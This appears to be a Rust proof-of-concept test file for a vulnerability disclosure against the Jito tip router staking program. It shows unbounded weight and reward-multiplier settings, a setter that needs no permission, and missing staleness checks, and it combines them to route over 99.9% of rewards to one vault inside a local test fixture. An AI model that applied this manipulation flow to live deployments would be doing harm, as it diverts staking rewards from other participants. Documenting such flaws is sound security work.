/// PoC: Weight Manipulation Attack via Unbounded no_feed_weight
///
/// Demonstrates a complete attack flow:
///   F-1: no_feed_weight has NO upper bound → u128::MAX accepted
///   F-2: reward_multiplier_bps has NO upper bound → any u64 accepted
///   F-3: switchboard_set_weight is PERMISSIONLESS → no signer required
///   F-4: no_feed path has NO staleness check → weight persists forever
///
/// Run:
///   cargo test -p jito-tip-router-integration-tests -- \
///     poc_weight_manipulation_attack --nocapture

#[cfg(test)]
mod poc_weight_manipulation_tests {

    use jito_tip_router_core::{
        constants::JITOSOL_SOL_FEED,
        ncn_fee_group::NcnFeeGroup,
        vault_registry::VaultRegistry,
        weight_table::WeightTable,
    };
    use solana_program::pubkey::Pubkey;

    use crate::fixtures::{test_builder::TestBuilder, TestResult};

    /// F-1: Verifies that no_feed_weight accepts extreme values (u128::MAX)
    /// without any upper-bound validation in register_st_mint.
    #[tokio::test]
    async fn poc_f1_no_feed_weight_unbounded() -> TestResult<()> {
        let mut fixture = TestBuilder::new().await;
        let mut tip_router_client = fixture.tip_router_client();
        let mut vault_client = fixture.vault_client();

        let test_ncn = fixture
            .create_initial_test_ncn(1, 1, None)
            .await?;

        let ncn = test_ncn.ncn_root.ncn_pubkey;
        let vault = vault_client
            .get_vault(&test_ncn.vaults[0].vault_pubkey)
            .await?;
        let st_mint = vault.supported_mint;

        // Register st_mint with EXTREME no_feed_weight (u128::MAX / 2 to avoid overflow)
        let extreme_weight: u128 = u128::MAX / 2;
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint,
                Some(NcnFeeGroup::default()),
                Some(10_000), // 100% reward multiplier
                None,          // NO switchboard feed → uses no_feed_weight
                Some(extreme_weight),
            )
            .await?;

        // Verify the extreme weight was accepted
        let vault_registry = tip_router_client.get_vault_registry(ncn).await?;
        let mint_entry = vault_registry.get_mint_entry(&st_mint).unwrap();

        assert_eq!(mint_entry.no_feed_weight(), extreme_weight,
            "no_feed_weight should accept extreme value");
        assert_eq!(*mint_entry.switchboard_feed(), Pubkey::default(),
            "switchboard_feed should be default (no oracle)");

        println!("✅ F-1 CONFIRMED: no_feed_weight = {} accepted with no upper bound",
            extreme_weight);

        Ok(())
    }

    /// F-2: Verifies that reward_multiplier_bps accepts values beyond 100% (10_000)
    /// without any upper-bound validation.
    #[tokio::test]
    async fn poc_f2_reward_multiplier_unbounded() -> TestResult<()> {
        let mut fixture = TestBuilder::new().await;
        let mut tip_router_client = fixture.tip_router_client();
        let mut vault_client = fixture.vault_client();

        let test_ncn = fixture
            .create_initial_test_ncn(1, 1, None)
            .await?;

        let ncn = test_ncn.ncn_root.ncn_pubkey;
        let vault = vault_client
            .get_vault(&test_ncn.vaults[0].vault_pubkey)
            .await?;
        let st_mint = vault.supported_mint;

        // Test 1: reward_multiplier_bps = 10_000 (100%) — should work
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint,
                Some(NcnFeeGroup::default()),
                Some(10_000), // 100%
                Some(JITOSOL_SOL_FEED),
                Some(1),
            )
            .await?;

        let vault_registry = tip_router_client.get_vault_registry(ncn).await?;
        let mint_entry = vault_registry.get_mint_entry(&st_mint).unwrap();
        assert_eq!(mint_entry.reward_multiplier_bps(), 10_000,
            "100% multiplier should be accepted");

        // Test 2: reward_multiplier_bps = 100_000 (1000%) — should ALSO work
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint,
                None,
                Some(100_000), // 1000% — NO UPPER BOUND!
                None,
                None,
            )
            .await?;

        let vault_registry = tip_router_client.get_vault_registry(ncn).await?;
        let mint_entry = vault_registry.get_mint_entry(&st_mint).unwrap();
        assert_eq!(mint_entry.reward_multiplier_bps(), 100_000,
            "1000% multiplier should be accepted — NO UPPER BOUND CHECK!");

        println!("✅ F-2 CONFIRMED: reward_multiplier_bps = 1000% accepted with no cap");

        Ok(())
    }

    /// F-3: Verifies that switchboard_set_weight is PERMISSIONLESS.
    /// Anyone can call it — no admin signer required.
    #[tokio::test]
    async fn poc_f3_switchboard_set_weight_permissionless() -> TestResult<()> {
        let mut fixture = TestBuilder::new().await;
        let mut tip_router_client = fixture.tip_router_client();
        let mut vault_client = fixture.vault_client();

        let test_ncn = fixture
            .create_initial_test_ncn(1, 1, None)
            .await?;

        let ncn = test_ncn.ncn_root.ncn_pubkey;
        let vault = vault_client
            .get_vault(&test_ncn.vaults[0].vault_pubkey)
            .await?;
        let st_mint = vault.supported_mint;

        // Register st_mint with no_feed_weight
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint,
                Some(NcnFeeGroup::default()),
                Some(10_000),
                None,          // no switchboard feed
                Some(1_000_000_000), // no_feed_weight
            )
            .await?;

        // Setup epoch state and weight table
        fixture.add_epoch_state_for_test_ncn(&test_ncn).await?;

        let clock = fixture.clock().await;
        let epoch = clock.epoch;
        tip_router_client
            .do_full_initialize_weight_table(ncn, epoch)
            .await?;

        // Call switchboard_set_weight — using ANY payer (not the NCN admin!)
        // The payer is the default test payer, NOT the ncn_admin
        tip_router_client
            .do_switchboard_set_weight(ncn, epoch, st_mint)
            .await?;

        // Verify the weight was set in the WeightTable
        let weight_table = tip_router_client.get_weight_table(ncn, epoch).await?;
        let stored_weight = weight_table.get_weight(&st_mint).unwrap();

        assert_eq!(stored_weight, 1_000_000_000,
            "Weight should be set to no_feed_weight via permissionless call");

        println!("✅ F-3 CONFIRMED: switchboard_set_weight called by non-admin payer");
        println!("   WeightTable weight set to: {}", stored_weight);

        Ok(())
    }

    /// F-4: Verifies that the no_feed_weight path has NO staleness check.
    /// Once set, the weight persists indefinitely until manually updated.
    #[tokio::test]
    async fn poc_f4_no_feed_staleness() -> TestResult<()> {
        let mut fixture = TestBuilder::new().await;
        let mut tip_router_client = fixture.tip_router_client();
        let mut vault_client = fixture.vault_client();

        let test_ncn = fixture
            .create_initial_test_ncn(1, 1, None)
            .await?;

        let ncn = test_ncn.ncn_root.ncn_pubkey;
        let vault = vault_client
            .get_vault(&test_ncn.vaults[0].vault_pubkey)
            .await?;
        let st_mint = vault.supported_mint;

        // Register with no_feed_weight (no oracle)
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint,
                Some(NcnFeeGroup::default()),
                Some(10_000),
                None,
                Some(500_000_000),
            )
            .await?;

        fixture.add_epoch_state_for_test_ncn(&test_ncn).await?;

        let clock = fixture.clock().await;
        let epoch = clock.epoch;
        tip_router_client
            .do_full_initialize_weight_table(ncn, epoch)
            .await?;

        // Set weight
        tip_router_client
            .do_switchboard_set_weight(ncn, epoch, st_mint)
            .await?;

        let weight_before = {
            let wt = tip_router_client.get_weight_table(ncn, epoch).await?;
            wt.get_weight(&st_mint).unwrap()
        };
        println!("Weight at epoch {}: {}", epoch, weight_before);

        // Warp forward 1000+ slots (~6+ minutes) — much more than SWITCHBOARD_MAX_STALE_SLOTS
        fixture.warp_slot_incremental(2000).await?;

        // Warp to next epoch
        fixture.warp_epoch_incremental(1).await?;

        let new_clock = fixture.clock().await;
        let new_epoch = new_clock.epoch;

        // Setup weight table for new epoch
        tip_router_client
            .do_full_initialize_weight_table(ncn, new_epoch)
            .await?;

        // Call switchboard_set_weight for new epoch — weight should STILL be no_feed_weight
        tip_router_client
            .do_switchboard_set_weight(ncn, new_epoch, st_mint)
            .await?;

        let weight_after = {
            let wt = tip_router_client.get_weight_table(ncn, new_epoch).await?;
            wt.get_weight(&st_mint).unwrap()
        };
        println!("Weight at epoch {} (after {} slots): {}",
            new_epoch, 2000, weight_after);

        // The weight should still be the same no_feed_weight — no staleness invalidation!
        assert_eq!(weight_before, weight_after,
            "Weight should persist unchanged — NO staleness check for no_feed path!");

        println!("✅ F-4 CONFIRMED: no_feed_weight persists across epochs");
        println!("   No staleness invalidation exists for the no_feed path");

        Ok(())
    }

    /// FULL ATTACK: Combines F-1 + F-2 + F-3 to demonstrate the complete
    /// reward manipulation scenario.
    ///
    /// Attack flow:
    ///   1. NCN admin registers st_mint with extreme no_feed_weight + reward_multiplier
    ///   2. Anyone (permissionless) triggers switchboard_set_weight
    ///   3. Weight persists forever (no staleness for no_feed)
    ///   4. During reward routing, attacker's vault gets >99.99% of rewards
    #[tokio::test]
    async fn poc_full_attack_combined() -> TestResult<()> {
        let mut fixture = TestBuilder::new().await;
        let mut tip_router_client = fixture.tip_router_client();
        let mut vault_client = fixture.vault_client();

        // Setup: 2 vaults, 1 operator each
        // Vault A (victim): normal weight
        // Vault B (attacker): extreme weight
        let test_ncn = fixture
            .create_initial_test_ncn(1, 2, None)
            .await?;

        let ncn = test_ncn.ncn_root.ncn_pubkey;

        // Get vault mints
        let vault_a = vault_client
            .get_vault(&test_ncn.vaults[0].vault_pubkey)
            .await?;
        let vault_b = vault_client
            .get_vault(&test_ncn.vaults[1].vault_pubkey)
            .await?;

        let st_mint_a = vault_a.supported_mint;
        let st_mint_b = vault_b.supported_mint;

        // Configure Vault A: normal weight via switchboard feed
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint_a,
                Some(NcnFeeGroup::default()),
                Some(10_000), // 100% reward multiplier
                Some(JITOSOL_SOL_FEED), // uses oracle
                Some(0), // no_feed_weight not used
            )
            .await?;

        // Configure Vault B: EXTREME no_feed_weight
        let extreme_weight: u128 = 1_000_000_000_000u128; // 1000x normal
        tip_router_client
            .do_admin_set_st_mint(
                ncn,
                st_mint_b,
                Some(NcnFeeGroup::default()),
                Some(100_000), // 1000% reward multiplier
                None,           // NO oracle — uses no_feed_weight
                Some(extreme_weight),
            )
            .await?;

        // Verify both mints registered
        let vault_registry = tip_router_client.get_vault_registry(ncn).await?;

        let entry_a = vault_registry.get_mint_entry(&st_mint_a).unwrap();
        let entry_b = vault_registry.get_mint_entry(&st_mint_b).unwrap();

        println!("Vault A: switchboard_feed={}, no_feed_weight={}",
            entry_a.switchboard_feed(), entry_a.no_feed_weight());
        println!("Vault B: switchboard_feed={}, no_feed_weight={}",
            entry_b.switchboard_feed(), entry_b.no_feed_weight());
        println!("Vault B reward_multiplier: {} bps ({}%)",
            entry_b.reward_multiplier_bps(),
            entry_b.reward_multiplier_bps() as f64 / 100.0);

        // Setup weights via permissionless switchboard_set_weight
        fixture.add_epoch_state_for_test_ncn(&test_ncn).await?;

        let clock = fixture.clock().await;
        let epoch = clock.epoch;
        tip_router_client
            .do_full_initialize_weight_table(ncn, epoch)
            .await?;

        // Permissionless: anyone triggers weight setting
        tip_router_client
            .do_switchboard_set_weight(ncn, epoch, st_mint_a)
            .await?;
        tip_router_client
            .do_switchboard_set_weight(ncn, epoch, st_mint_b)
            .await?;

        // Read weights
        let weight_table = tip_router_client.get_weight_table(ncn, epoch).await?;
        let weight_a = weight_table.get_weight(&st_mint_a).unwrap();
        let weight_b = weight_table.get_weight(&st_mint_b).unwrap();

        println!("\nWeight Table:");
        println!("  Vault A weight: {}", weight_a);
        println!("  Vault B weight: {} ({}x Vault A)", weight_b, weight_b / weight_a.max(1));

        // Calculate stake weight ratio
        // total_stake_weight = delegation.total_security() * weight
        // With equal delegation (100 lamports each):
        let delegation: u128 = 100;
        let sw_a = delegation * weight_a; // Vault A stake weight
        let sw_b = delegation * weight_b; // Vault B stake weight

        println!("\nStake Weight (with 100 lamport delegation each):");
        println!("  Vault A: {}", sw_a);
        println!("  Vault B: {}", sw_b);

        let total_sw = sw_a + sw_b;
        let share_a = (sw_a as f64 / total_sw as f64) * 100.0;
        let share_b = (sw_b as f64 / total_sw as f64) * 100.0;

        println!("\nReward Share:");
        println!("  Vault A (victim):  {:.6}%", share_a);
        println!("  Vault B (attacker): {:.6}%", share_b);

        // Attacker dominates
        assert!(share_b > 99.9,
            "Attacker should get >99.9% of rewards. Got: {:.4}%", share_b);

        println!("\n✅ FULL ATTACK CONFIRMED:");
        println!("   1. no_feed_weight = {} (extreme) accepted ✅", extreme_weight);
        println!("   2. reward_multiplier_bps = {} (extreme) accepted ✅", entry_b.reward_multiplier_bps());
        println!("   3. switchboard_set_weight called permissionlessly ✅");
        println!("   4. Attacker vault gets {:.6}% of rewards ✅", share_b);

        Ok(())
    }
}
